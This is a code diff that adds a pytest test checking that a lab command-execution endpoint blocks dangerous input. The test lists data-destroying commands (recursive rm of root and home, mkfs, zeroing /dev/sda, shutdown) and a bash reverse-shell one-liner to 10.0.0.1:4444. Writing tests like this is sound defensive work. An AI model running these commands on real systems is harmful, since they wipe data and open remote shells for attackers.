@@ -156,3 +156,21 @@ def test_batch_labs_control(client):
     data = res.json()
     assert data["status"] == "completed"
 
+
+def test_lab_exec_blocked_regex_patterns(client):
+    dangerous_payloads = [
+        "rm -rf ~",
+        "rm  -rf  /",
+        "rm -r -f /",
+        "mkfs.ext4 /dev/sdb",
+        "cat /dev/zero > /dev/sda",
+        "shutdown -h now",
+        "bash -i >& /dev/tcp/10.0.0.1/4444",
+    ]
+    for cmd in dangerous_payloads:
+        res = client.post("/api/labs/01/exec", json={"command": cmd})
+        assert res.status_code == 200
+        data = res.json()
+        assert data["status"] == "blocked", f"Expected {cmd} to be blocked"
+        assert "위험한 시스템 파괴 명령어" in data["output"]
+
